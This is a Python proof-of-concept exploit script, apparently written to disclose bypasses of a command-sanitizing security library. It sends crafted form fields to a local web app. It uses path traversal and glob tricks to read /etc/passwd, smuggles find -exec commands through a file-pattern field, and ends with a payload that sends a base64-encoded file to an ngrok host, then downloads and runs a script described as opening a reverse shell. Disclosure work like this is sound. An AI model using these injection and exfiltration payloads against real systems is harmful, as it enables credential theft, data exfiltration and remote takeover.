import requests

url = "http://127.0.0.1:5000"

# Example exploits of which bypass python-security safe_commandc

# Targeting list_files which uses grep_user_file with shell=False

# Directory traversal not caught since only .endswith() is used in check_sensitive_files
data = {
    "username": "testuser",
    "search_files": "search_files",
    "filename": "../../../../../../../../../../../../etc/sudoers.d/../passwd",
    "search_query": ":"

}
# Prints the contents of /etc/passwd bypassing PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES check
print(requests.post(url, data=data).text)



# Targeting list_files which uses find_user_file with shell=True

# Globbing and multiple ///s also not caught since only .endswith() is used check_sensitive_files
data = {
    "username": "testuser",
    "list_files": "list_files",
    "file_pattern": "/etc///pa*sswd*",

}
# Prints the contents of /etc/passwd bypassing PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES check
print(requests.post(url, data=data).text)

# Chained commands that leverage other binaries not caught since no separator is used. 
# This affects more than just the find command, xargs, byoubu-ugraph, and many others can be used to chain commands,
# find is just one of the most common simple examples.
data = {
    "username": "testuser",
    "list_files": "list_files",
    "file_pattern": "*.txt' -exec cat /etc///pa*sswd* {} '+",

}
# Prints the contents of /etc/passwd bypassing PREVENT_COMMAND_CHAINING and PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES checks
print(requests.post(url, data=data).text)


# Banned executable only raise an exception if nested at the same level as the invoking command in a command chain.
# This is not caught since the banned executable is nested in a command substitution subshell within sh -c subshell.
# The core issue here is values within quotes are not parsed for shell syntax or banned executables.
data = {
    "username": "testuser",
    "list_files": "list_files",
    "file_pattern": "*.txt' -exec sh -c \"echo $(curl -o bot.sh https://e171-216-243-47-166.ngrok-free.app/$(base64 < exfil.txt) ) $(sleep 2) $(chmod +x bot.sh) $(./bot.sh) etc\" {} '+",

}
# Exfils data and downloads and executes malicious script using curl that opens a reverse shell
# bypassing PREVENT_COMMAND_CHAINING and PREVENT_COMMON_EXPLOIT_EXECUTABLES checks
print(requests.post(url, data=data).text)